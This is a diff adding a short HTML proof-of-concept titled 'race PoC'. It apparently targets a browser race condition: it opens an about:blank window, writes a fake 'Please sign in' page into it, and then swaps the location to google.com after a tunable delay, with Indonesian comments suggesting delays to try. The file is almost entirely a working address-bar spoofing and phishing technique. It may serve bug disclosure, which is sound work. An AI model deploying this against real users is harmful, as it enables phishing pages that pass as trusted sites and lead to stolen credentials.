@@ -1,0 +1,25 @@
+<!-- attacker-aboutblank-race.html -->
+<!doctype html>
+<meta charset="utf-8">
+<title>race PoC</title>
+<script>
+function f() {
+  const w = window.open('about:blank', '_blank');
+  try {
+    w.document.open();
+    w.document.write('<h1>Fake: Please sign in</h1><p>Attacker-controlled</p>');
+    w.document.close();
+  } catch(e) { console.warn(e); }
+
+  // sesuaikan delay untuk eksperimen
+  setTimeout(() => {
+    try {
+      w.location.replace('https://google.com/');
+    } catch(e) {
+      console.warn('replace blocked:', e);
+    }
+  }, 200); // coba 50ms, 100ms, 400ms, dst
+}
+</script>
+<body><button onclick="f()">Run race</button></body>
+</html>
